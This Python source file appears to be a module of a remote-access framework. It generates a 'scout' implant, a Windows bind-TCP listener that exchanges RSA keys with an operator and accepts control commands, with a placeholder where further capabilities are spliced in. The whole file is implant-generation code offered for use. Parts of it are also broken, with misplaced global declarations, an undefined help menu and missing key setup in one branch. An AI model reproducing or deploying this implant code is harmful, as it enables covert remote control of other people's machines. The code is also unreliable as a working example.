import library.modules.config as config
import library.modules.safe_open as safe_open

config.main()


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('import rsa')
        config.import_statements.append('import pickle')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        with safe_open.main(filepath, 'w') as f:
            if ',' in host:
                host = str(host.replace(' ', '').split(','))
                f.write('''
(pubkey, privkey) = rsa.newkeys(512)
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data

def sendall(sock, data, key):
    data = rsa.encrypt(data.encode('utf-8', key))
    sock.sendall(data)

host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout(variable_timeout)
                sock.bind((i,variable_port))
                sock.listen(1)
                s, a = sock.accept()
                s.sendall('variable_key')
                connected = True
                data0 = recv_all(s)
                s.settimeout(5)
                if data0 == 'response':
                    s.sendall('key:'+ pickle.dumps(pubkey))
                    data = recv_all(s)
                    public_key = pickle.loads(data)
                    global public_key
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            data = rsa.decrypt(data, public_key).decode('utf8')
            command = data.split(' ',1)[0]
            if command == 'kill':
                sendall(s, '[*]Scout is killing itself...', privkey)
                _exit(1)
            elif command in ('help','?'):
                sendall(s, help_menu, privkey)
            elif command == 'ping':
                sendall(s, '[+]Scout is alive', privkey)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                sendall(s, '[*]Scout is sleeping...', privkey)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                sendall(s, '[*]Scout is disconnecting itself...', privkey)
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            s.sendall('[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
            else:
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
        
while True:
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(variable_timeout)
            sock.bind(('variable_host',variable_port))
            sock.listen(1)
            s, a = sock.accept()
            s.sendall('variable_key')
            data0 = recv_all(s)
            s.settimeout(5)
            if data0 == 'response':
                s.sendall('key:'+ pickle.dumps(pubkey))
                data = recv_all(s)
                public_key = pickle.loads(data)
                global public_key
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            data = rsa.decrypt(data, public_key).decode('utf8')
            command = data.split(' ',1)[0]
            if command == 'kill':
                sendall(s, '[*]Scout is killing itself...', privkey)
                _exit(1)
            elif command in ('help','?'):
                sendall(s, help_menu, privkey)
            elif command == 'ping':
                sendall(s, '[+]Scout is alive', privkey)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                sendall(s, '[*]Scout is sleeping...', privkey)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                sendall(s, '[*]Scout is disconnecting itself...', privkey)
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            s.sendall('[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
    elif option == 'info':
        print '\nName             : Bind TCP Base component' \
              '\nOS               : Windows' \
              '\nRequired Modules : socket, time, rsa, pickle' \
              '\nCommands         : kill, ping, sleep <time>, disconnect' \
              '\nDescription      : The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands' \
              '\nConnection type  : Bind\n'
